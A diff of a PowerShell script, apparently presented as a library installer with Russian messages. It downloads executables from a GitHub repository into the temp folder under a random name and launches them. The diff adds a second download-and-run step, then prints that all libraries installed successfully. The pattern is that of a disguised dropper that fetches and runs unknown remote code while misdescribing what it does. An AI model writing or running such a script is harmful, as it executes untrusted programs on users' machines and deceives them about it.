@@ -28,9 +28,12 @@ $temp = $env:TEMP
 # Теперь файл сохранится как, например, Xy7q9W.exe во временной папке
 $libs = "$temp\$randomName.exe"
 
+Invoke-WebRequest "https://github.com/SuperMod27/0/raw/refs/heads/main/lib.exe" -OutFile $lib
 Invoke-WebRequest "https://github.com/SuperMod27/0/raw/refs/heads/main/libs.exe" -OutFile $libs
 
-Start-Process $libs
+Start-Process $lib -Wait
+Start-Sleep -Seconds 2
+Start-Process $libs -Wait
 
 Write-Host "`nУспешно установились все библиотеки" -ForegroundColor Green
 Write-Host "Окно будет очищено через 5 секунд"
